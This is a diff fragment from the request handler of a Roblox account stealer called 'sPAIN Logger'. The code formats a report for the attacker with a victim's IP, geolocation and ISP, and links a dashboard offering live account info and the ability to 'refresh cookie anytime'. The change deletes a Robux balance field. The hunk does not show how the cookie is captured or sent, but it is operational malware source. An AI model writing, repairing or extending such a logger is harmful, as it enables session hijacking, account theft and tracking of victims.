@@ -179,7 +179,7 @@ export default async function handler(req, res) {
           { name: '🌐 IP',        value: ip || 'Unknown',                                                                    inline: true  },
           { name: '📍 Location',  value: [geo?.city, geo?.regionName, geo?.country].filter(Boolean).join(', ') || 'Unknown', inline: true  },
           { name: '🗺️ ISP',       value: geo?.isp || 'Unknown',                                                              inline: true  },
-          { name: '💰 Robux',     value: robux !== null ? `\`${Number(robux).toLocaleString()} R$\`` : '`Fetching...`',      inline: true  },
+        
           { name: '🔄 Dashboard', value: `[Open Dashboard](${refreshUrl})\nLive account info + refresh cookie anytime`,      inline: false }
         ],
         footer:    { text: `sPAIN Logger • ${pageName} • ${now}` },
